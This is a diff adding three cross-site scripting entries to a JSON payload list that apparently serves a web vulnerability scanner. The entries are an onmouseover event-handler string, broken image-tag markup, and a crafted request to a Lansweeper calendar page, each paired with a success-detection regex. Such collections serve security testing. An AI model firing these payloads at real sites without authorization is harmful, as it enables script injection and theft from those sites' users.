@@ -164294,5 +164294,38 @@
       "expected_status_code": 200,
       "success_regex": "<script|onerror|onload|alert\\(|javascript:"
     }
+  },
+  {
+    "payload_id": "OWP-474657",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "onmouseover=prompt(XSS Code) bad=",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-474679",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "><>XSS<br /><img src=",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-474686",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://victim.com/Calendar/CalendarActions.aspx?action=scheduleinfo&id=2&__VIEWSTATE=&title=Test+Lansweeper&description=XSS/HTMLI&type=1&startdate=13/10/2017&txtStart=19:30&enddate=13/10/2017&txtEnd=21:30&reminder=15&repeattype=1&amount=1&repeatby=0&monthday=1&monthweekday=1&monthweekdayday=1&ends=1&occurrences=15&repeatenddate=&agents={",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
   }
 ]
